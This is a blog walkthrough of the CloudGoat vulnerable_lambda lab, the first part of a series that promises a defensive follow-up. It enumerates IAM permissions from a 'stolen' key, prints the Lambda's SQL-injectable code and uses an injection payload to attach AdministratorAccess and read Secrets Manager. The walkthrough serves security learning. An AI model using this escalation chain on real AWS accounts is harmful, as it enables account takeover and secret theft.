---
title:  "CloudGoat Vulnerable Lambda Scenario - Part 1 (Attack)"
description: > 
    An in-depth walkthrough covering how to both attack and defend CloudGoat's 
    vulnerable lambda challenge.
date: 2023-03-03 00:55:43-05:00
categories: [Cloud, AWS] 
tags: [aws, cloud, lab, walkthrough, lambda]
toc: true
---

![cloudgoat](/assets/img/cloudgoat.webp){: .center-image}

## What is CloudGoat?

[CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) is a purposely 
vulnerable AWS lab open sourced by 
[Rhino Security Labs](https://rhinosecuritylabs.com/) to provide an easily 
deployable and approachable way for users to practice their offensive cloud
security techniques. 

## How is _this_ walk-through different?

Truth be told, Rhino Security Labs provides an official walk-through for each
CloudGoat scenario (e.g., [vulnerable](https://rhinosecuritylabs.com/cloud-security/cloudgoat-vulnerable-lambda-functions/) 
[lambda](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/cheat_sheet.md)), 
and there are a number of "unofficial" walk-throughs available in the form of 
blog posts. However, these walk-throughs focus solely on successfully exploiting
the relevant vulnerabilities. My intention with this series is to go one (or 
two) steps further by showing you how to defend against these attack techniques.
This includes detecting, responding to and preventing the attack technique. 
First things first, let's step through the [vulnerable_lambda scenario](https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/vulnerable_lambda) 
with one minor modification. We'll assume the role of an attacker who has 
(somehow) compromised this access key without any additional context (e.g., the 
access key was accidentally leaked as a hard-coded secret in a public GitHub 
repository).

## Setting Up the Development Environment

### CloudGoat Installation and Configuration

[CloudGoat's quick start guide](https://github.com/RhinoSecurityLabs/cloudgoat#quick-start) 
should suffice in getting the scenario up and running, but I'll quickly walk 
through how I set up my configuration. Ensure you've satisfied the 
[documented requirements](https://github.com/RhinoSecurityLabs/cloudgoat#requirements) 
before following along.

These days, I'm particularly biased towards avoiding dependency conflicts and 
maintaining clean and self-contained development environments. To that end, I 
highly recommend leveraging tools such as `venv` and [pyenv](https://github.com/pyenv/pyenv) to manage Python 
dependencies, or Earthly and/or Docker (e.g., in the form of VSCode 
Dev Containers). 

Additionally, When using the AWS CLI, I prefer to leverage [`aws-vault`](https://github.com/99designs/aws-vault)
to manage credentials. Ultimately, `aws-vault` uses the OS secure keystore to 
lock down access to these credentials and makes the necessary AWS STS API calls 
to generate temporary credentials for access. This approach prevents AWS 
credentials from being stored in plaintext on the local filesystem.

### Dedicated IAM Role for CloudGoat Terraform Execution

~~In an ideal world, there would be a programmatic way to craft an IAM policy for this Terraform role, but I haven't discovered one that is officially supported and simple to use (e.g., anything that's not running `terraform apply` and playing whack-a-mole with AWS API error messages).~~

[Ian McKay](https://twitter.com/iann0036) to the rescue! We can utilize [iamlive](https://github.com/iann0036/iamlive) 
to dynamically build an IAM policy for the Terraform role that strictly 
abides by the principle of least privilege. [This blog post](https://blog.symops.com/2022/05/06/least-privilege-policies-from-aws-logs/) 
by [Adam Buggia](https://twitter.com/abuggia) covers the process of setting up 
iamlive with [localstack](https://localstack.cloud/) to generate the necessary 
IAM policy without ever touching your AWS account! For each CloudGoat scenario, 
you'll need to copy the `terraform` directory to a new directory (e.g., `/tmp`) 
and following the steps outlined by the referenced blog post. Alternatively, you 
can find the IAM policy we're after below!   

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "iam:GetUser",
                "iam:GetUserPolicy",
                "iam:ListAccessKeys",
                "iam:GetRole",
                "lambda:GetFunction",
                "iam:CreateUser",
                "iam:CreateAccessKey",
                "iam:PutUserPolicy",
                "iam:CreateRole",
                "iam:PutRolePolicy",
                "iam:ListRolePolicies",
                "iam:GetRolePolicy",
                "iam:ListAttachedRolePolicies",
                "secretsmanager:CreateSecret",
                "secretsmanager:DescribeSecret",
                "secretsmanager:GetResourcePolicy",
                "secretsmanager:PutSecretValue",
                "secretsmanager:GetSecretValue",
                "lambda:CreateFunction",
                "iam:PassRole",
                "lambda:ListVersionsByFunction",
                "lambda:GetFunctionCodeSigningConfig",
                "iam:DeleteUserPolicy",
                "iam:DeleteAccessKey",
                "iam:ListInstanceProfilesForRole",
                "secretsmanager:DeleteSecret",
                "iam:DeleteRolePolicy",
                "iam:DeleteRole",
                "lambda:DeleteFunction",
                "iam:ListGroupsForUser",
                "iam:DeleteUser",
                "iam:TagUser",
                "iam:TagRole",
                "lambda:TagResource",
                "secretsmanager:TagResource"
            ],
            "Resource": "*"
        }
    ]
}
```

Now that we have the necessary IAM policy document formed, we can create a 
dedicated IAM role and attach this policy:  

```bash
aws-vault exec admin -- aws iam create-role --role-name terraform-cloudgoat \
    --assume-policy-document file://terraform-cloudgoat-assume-policy.json
aws-vault exec admin -- aws iam put-role-policy --role-name terraform-cloudgoat \
    --policy-name vulnerable_lambda --policy-document file://terraform-cloudgoat-policy.json
```

> **NOTE:** If you've configured your CloudGoat AWS account to authenticate via
> assumed role, you'll need to comment out the `profile` attribute within the 
> `aws` provider block in the relevant `provider.tf` file (e.g., [here](https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/scenarios/vulnerable_lambda/terraform/provider.tf#L2) 
> for the vulnerable_lambda scenario).
>
> ```terraform
>   provider "aws" {
>   # profile = var.profile
>   region = var.region
>
>   default_tags {
>     tags = {
>       Name     = "cg-${var.cgid}"
>       Stack    = var.stack-name
>       Scenario = var.scenario-name
>     }
>   }
> ```
{: .prompt-warning }

Finally, we'll configure the profile and IP allowlist for CloudGoat and create
the scenario. The profile should point to the dedicated IAM role we've just 
created for CloudGoat's Terraform execution. 

```bash
./cloudgoat.py config profile
./cloudgoat.py config whitelist --auto
aws-vault exec cloudgoat -- ./cloudgoat.py create vulnerable_lambda
```

Once the scenario has been deployed, let's configure the "stolen" AWS access 
key, which can be found in the `start.txt` file in the created scenario 
directory. We can either set the `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` 
environment variables or use the `aws-vault add` command (e.g., 
`aws-vault add bilbo`).

## Situational Awareness

In a real-life scenario, we would have just compromised the IAM user's 
credentials and we'll need to answer some initial questions before we make our 
next move.

**Who am I?** To which IAM user does the compromised access key belong?  
**Where am I?** In which AWS account are we operating?  

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDAW43MRFXBUNEW7N4JI",
    "Account": "REDACTED",
    "Arn": "arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt"
}
```

AWS account aliases could sometimes hint at the purpose of the account, and what 
resources could be available.

```bash
aws iam list-account-aliases     
```

```json
{
    "AccountAliases": []
}
```

## Discovery

Enumerating the permissions attached to an IAM user is a multi-step process, as 
there are several methods available to grant access. Let's start with listing
the user's group memberships.  

```bash
aws iam list-groups-for-user --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
```

```json
{
    "Groups": []
}
```

It appears the user doesn't belong to any groups. What about IAM policies (both 
managed and inline) that have been attached directly to the user? 

```bash
aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
```

```json
{
    "AttachedPolicies": []
}
```

```bash
aws iam list-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
```

```json
{
    "PolicyNames": [
        "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer"
    ]
}
```

What permissions does this inline policy grant to the `bilbo` user?

```bash
aws iam get-user-policy --policy-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
```

```json
{
    "UserName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt",
    "PolicyName": "cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": "sts:AssumeRole",
                "Resource": "arn:aws:iam::REDACTED:role/cg-lambda-invoker*"
            },
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": [
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Resource": "*"
            }
        ]
    }
}
```

According to this output, the `bilbo` user is able to list and describe IAM 
resources and simulate IAM policies. More interestingly, they are able to assume
any role prepended with the string "cg-lambda-invoker." Let's see if such a role
exists in the target account.  

```bash
aws iam list-roles --query 'Roles[].RoleName' | grep -i cg-lambda-invoker
```

```bash
"cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
```

The name of the role that this IAM user can assume is a bit telling 
("cg-lambda-invoker"). If this role was named something else, how could we 
determine its capabilities? We'll need to list and describe the policies 
attached to this role.

```bash
aws iam list-role-policies --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt   
```

```json
{
    "PolicyNames": [
        "lambda-invoker"
    ]
}
```

What permissions does this `lambda-invoker` policy grant? 
```bash
aws iam get-role-policy --policy-name lambda-invoker --role-name cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
```

```json
{
    "RoleName": "cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt",
    "PolicyName": "lambda-invoker",
    "PolicyDocument": {
        "Statement": [
            {
                "Action": [
                    "lambda:ListFunctionEventInvokeConfigs",
                    "lambda:InvokeFunction",
                    "lambda:ListTags",
                    "lambda:GetFunction",
                    "lambda:GetPolicy"
                ],
                "Effect": "Allow",
                "Resource": [
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
                    "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1"
                ]
            },
            {
                "Action": [
                    "lambda:ListFunctions",
                    "iam:Get*",
                    "iam:List*",
                    "iam:SimulateCustomPolicy",
                    "iam:SimulatePrincipalPolicy"
                ],
                "Effect": "Allow",
                "Resource": "*"
            }
        ],
        "Version": "2012-10-17"
    }
}
```

This role policy overlaps quite a bit with the inline policy attached to the 
`bilbo` user, but there are several new Lambda actions that could lead us to 
some interesting resources. Before we move forward, we'll need to configure the 
AWS CLI to assume this role. The easiest way to do so is by adding a second 
profile that references the first one in `~/.aws/config`:  

```conf
[profile bilbo]

[profile cg-lambda-invoker]
source_profile=bilbo
role_arn=arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt
```

Now that we can assume this role from the CLI, our next task is to list all 
Lambda functions.

```bash
aws lambda list-functions --region us-east-1
```

```json
{
    "Functions": [
        {
            "FunctionName": "vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
            "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
            "Handler": "main.handler",
            "CodeSize": 991559,
            "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2023-02-19T19:11:38.016+0000",
            "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
            "Version": "$LATEST",
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "5cc6a0d3-c4be-4a66-abcc-4601b55883e0",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            }
        }
    ]
}
```

> **NOTE:** Lambda functions, like many AWS resources, are region-specific. As 
> such, we should check multiple regions (if not all active ones).
{: .prompt-info }

To fully understand what this Lambda function can do, let's download the source
code. This can be found in the `Code.Location` attribute when calling 
`lambda:GetFunction`.

```bash
aws lambda get-function --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
```

```json
{
    "Configuration": {
        "FunctionName": "vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "FunctionArn": "arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "Runtime": "python3.9",
        "Role": "arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1",
        "Handler": "main.handler",
        "CodeSize": 991559,
        "Description": "This function will apply a managed policy to the user of your choice, so long as the database says that it's okay...",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2023-02-19T19:11:38.016+0000",
        "CodeSha256": "U982lU6ztPq9QlRmDCwlMKzm4WuOfbpbCou1neEBHkQ=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "5cc6a0d3-c4be-4a66-abcc-4601b55883e0",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://REDACTED"
    },
    "Tags": {
        "Name": "cg-vulnerable_lambda_cgidlbywef16bt",
        "Scenario": "vulnerable-lambda",
        "Stack": "CloudGoat"
    }
}
```

```bash
> wget https://REDACTED -O lambda_function
> unzip lambda_function -d lambda_function-unzipped
> ls lambda_function-unzipped 
bin                                  click_default_group.py      main.py                          pytz-2021.1.dist-info  sqlite_fts4                  tabulate-0.8.9.dist-info
click                                dateutil                    my_database.db                   requirements.txt       sqlite_fts4-1.0.1.dist-info  tabulate.py
click-8.0.1.dist-info                dateutils                   python_dateutil-2.8.2.dist-info  six-1.16.0.dist-info   sqlite_utils
click_default_group-1.2.2.dist-info  dateutils-0.6.12.dist-info  pytz                             six.py                 sqlite_utils-3.17.dist-info
```

`main.py` seems to be a reasonable starting point!  

```python
import boto3
from sqlite_utils import Database

db = Database("my_database.db")
iam_client = boto3.client('iam')


# db["policies"].insert_all([
#     {"policy_name": "AmazonSNSReadOnlyAccess", "public": 'True'}, 
#     {"policy_name": "AmazonRDSReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AWSLambda_ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonS3ReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonGlacierReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AmazonRoute53DomainsReadOnlyAccess", "public": 'True'},
#     {"policy_name": "AdministratorAccess", "public": 'False'}
# ])


def handler(event, context):
    target_policys = event['policy_names']
    user_name = event['user_name']
    print(f"target policys are : {target_policys}")

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
        for row in db.query(statement):
            statement_returns_valid_policy = True
            print(f"applying {row['policy_name']} to {user_name}")
            response = iam_client.attach_user_policy(
                UserName=user_name,
                PolicyArn=f"arn:aws:iam::aws:policy/{row['policy_name']}"
            )
            print("result: " + str(response['ResponseMetadata']['HTTPStatusCode']))

        if not statement_returns_valid_policy:
            invalid_policy_statement = f"{policy} is not an approved policy, please only choose from approved " \
                                       f"policies and don't cheat. :) "
            print(invalid_policy_statement)
            return invalid_policy_statement

    return "All managed policies were applied as expected."


if __name__ == "__main__":
    payload = {
        "policy_names": [
            "AmazonSNSReadOnlyAccess",
            "AWSLambda_ReadOnlyAccess"
        ],
        "user_name": "cg-bilbo-user"
    }
    print(handler(payload, 'uselessinfo'))
```

This Lambda handler takes two arguments upon invocation, `user_name` (string) 
and `policy_names` (string array). It then loops through the provided values in
the `policy_names` argument, using each as part of a SQL statement executed 
against `my_database.db`. If the policy name is present in the `policy_name` 
column of the `policies` table in the database and the value of `public` is 
`True` that IAM policy is applied to the provided username. The call to 
`insert_all` that's commented out is left as a breadcrumb to hint at the 
database schema. Let's verify this:  

```bash
> sqlite3 my_database.db 'select * from policies;'
AmazonSNSReadOnlyAccess|True
AmazonRDSReadOnlyAccess|True
AWSLambda_ReadOnlyAccess|True
AmazonS3ReadOnlyAccess|True
AmazonGlacierReadOnlyAccess|True
AmazonRoute53DomainsReadOnlyAccess|True
AdministratorAccess|False
```

Using string formatting to dynamically build a SQL statement without the use of 
prepared statements opens up the application logic to risk of SQL injection 
attacks. Directly using user input that is controllable by an attacker without
any form of sanitization drastically increases that risk. It's time to hunt for 
and exploit a potential SQLi bug.

## Privilege Escalation

In this case, we could prematurely terminate the following SQL statement because
the value of `policy` is attacker-controlled, removing the requirement of 
`public = 'True'`:  

```python
statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"`
```

```bash
aws lambda invoke --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 --payload '{"policy_names":["AdministratorAccess'\''; --"],"user_name":"cg-bilbo-vulnerable_lambda_cgidlbywef16bt"}' --cli-binary-format raw-in-base64-out response.json --region us-east-1
```

```json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

The contents of the JSON response offer a bit more insight:  

```bash
> cat response.json                                                             
"All managed policies were applied as expected."
```

We can verify whether or not our attempt was successful by checking the `bilbo` 
IAM user for additional policies (beyond the inline user policy created 
alongside the user):  

```bash
aws iam list-attached-user-policies --user-name cg-bilbo-vulnerable_lambda_cgidlbywef16bt
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

## Post-Exploitation

Now that we have full admin access, we can persist, move laterally, pillage 
secrets and source code, etc. Listing secrets in Secrets Manager 
will retrieve the scenario's flag.

```bash
aws secretsmanager list-secrets
```

```json
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-quMGQi",
            "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
            "LastChangedDate": "2023-02-19T14:11:26.843000-05:00",
            "LastAccessedDate": "2023-02-18T19:00:00-05:00",
            "Tags": [
                {
                    "Key": "Stack",
                    "Value": "CloudGoat"
                },
                {
                    "Key": "Name",
                    "Value": "cg-vulnerable_lambda_cgidlbywef16bt"
                },
                {
                    "Key": "Scenario",
                    "Value": "vulnerable-lambda"
                }
            ],
            "SecretVersionsToStages": {
                "183B5F61-1B84-4465-BDCD-13CE9953ECC2": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2023-02-19T14:11:26.623000-05:00"
        }
    ]
}
```

```bash
aws secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag  
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-quMGQi",
    "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
    "VersionId": "183B5F61-1B84-4465-BDCD-13CE9953ECC2",
    "SecretString": "cg-secret-846237-284529",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-02-19T14:11:26.837000-05:00"
}
```

## The CloudFox Remix

[Bishop Fox](https://bishopfox.com/) developed and open sourced [cloudfox](https://github.com/BishopFox/cloudfox), 
which is a tool designed to automate the process of identifying potentially 
exploitable attack paths within a target cloud environment. In this section, 
we'll repeat the entire exercise using cloudfox.

What IAM permissions are attached to this IAM user?

```bash
cloudfox aws permissions --principal arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt -o csv     
```

|Service|Principal Type|Name                                     |Policy Type|Policy Name                                                    |Effect|Action                     |Resource                                         |
|-------|--------------|-----------------------------------------|-----------|---------------------------------------------------------------|------|---------------------------|-------------------------------------------------|
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |sts:AssumeRole             |arn:aws:iam::REDACTED:role/cg-lambda-invoker*|
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:Get*                   |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:List*                  |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:SimulateCustomPolicy   |*                                                |
|IAM    |User          |cg-bilbo-vulnerable_lambda_cgidlbywef16bt|Inline     |cg-bilbo-vulnerable_lambda_cgidlbywef16bt-standard-user-assumer|Allow |iam:SimulatePrincipalPolicy|*                                                |

Show me all IAM roles prefixed with "cg-lambda-invoker":  

```bash
cloudfox aws principals -o csv
```

| Service | Type | Name | Arn |
|-------|------|-----------|-----|
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt |

What permissions does the "cg-lambda-invoker" role have?

```bash
cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt -o csv
```

| Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
|---------|----------------|------|-------------|-------------|--------|--------|----------|
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctionEventInvokeConfigs | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:InvokeFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListTags | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetFunction | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:GetPolicy | arn:aws:lambda:us-east-1:REDACTED:function:vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | lambda:ListFunctions | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:Get* | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:List* | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:SimulateCustomPolicy | * |
| IAM | Role | cg-lambda-invoker-vulnerable_lambda_cgidlbywef16bt | Inline | lambda-invoker | Allow | iam:SimulatePrincipalPolicy | * |

Before we jump right to downloading the Lambda function itself, let's gather 
some more information:

```bash
cloudfox aws lambda
```

| Service | Region | Resource Arn | Role | IsAdminRole? |
|---------|--------|--------------|------|--------------|
| Lambda| us-east-1 | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | No |

What kind of permissions does the IAM role attached to this Lambda function have?

```bash
cloudfox aws permissions --principal arn:aws:iam::REDACTED:role/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
```

| Service | Principal Type | Name | Policy Type | Policy Name | Effect | Action | Resource |
|---------|----------------|------|-------------|-------------|--------|--------|----------|
| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | iam:AttachUserPolicy | arn:aws:iam::REDACTED:user/cg-bilbo-vulnerable_lambda_cgidlbywef16bt |
| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | s3:GetObject | * |
| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogGroup | arn:aws:logs:*:*:* |
| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:CreateLogStream | arn:aws:logs:*:*:log-group:*:* |
| IAM | Role | vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | Inline | policy_applier_lambda1 | Allow | logs:PutLogEvents | arn:aws:logs:*:*:log-group:*:* |

cloudfox was kind enough to print out the AWS CLI commands necessary to download
the function code. We simply need to make some minor tweaks for it to work 
properly (especially with `aws-vault`).  

```bash
cat cloudfox-output/aws/REDACTED/loot/lambda-get-function-commands.txt
#############################################
# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
# Set the $profile environment variable to the profile you are going to use to inspect the buckets.
# E.g., export profile=dev-prod.
#############################################

=============================================
# Lambda Name: vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1

# Get function metadata including download location
aws --profile $profile --region us-east-1 lambda get-function --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
# Download function code to to disk (requires jq and curl) 
mkdir -p ./lambdas/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1
url=`aws --profile $profile lambda get-function --region us-east-1 --function-name vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1 | jq .Code.Location | sed s/"//g` && curl "$url" -o ./lambdas/vulnerable_lambda_cgidlbywef16bt-policy_applier_lambda1.zip
```

Exploitation of the SQL injection bug in this Lambda function needs to be done
manually. Once the AdministratorAccess managed policy has been attached to the 
`bilbo` user, we can use the `secrets` cloudfox command to retrieve the flag.

```bash
cloudfox aws secrets                  
```

```bash
cat cloudfox-output/aws/REDACTED/loot/pull-secrets-commands.txt                           
#############################################
# The profile you will use to perform these commands is most likely not the profile you used to run CloudFox
# Set the $profile environment variable to the profile you are going to use to pull the secrets/parameters.
# E.g., export profile=dev-prod.
#############################################

aws --profile $profile --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag
```

```bash
aws --region us-east-1 secretsmanager get-secret-value --secret-id vulnerable_lambda_cgidlbywef16bt-final_flag
```

```json
{
    "ARN": "arn:aws:secretsmanager:us-east-1:REDACTED:secret:vulnerable_lambda_cgidlbywef16bt-final_flag-Sif8pD",
    "Name": "vulnerable_lambda_cgidlbywef16bt-final_flag",
    "VersionId": "4388D5FC-A56B-457A-8FF6-0D4CBBFF9CD1",
    "SecretString": "cg-secret-846237-284529",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-01-09T19:54:47.793000-05:00"
}
```

## How can we respond to this?

In part two of this series, we'll put on our incident response hat and actively
investigate and defend against this attack.

Happy (hacking\|hunting)!
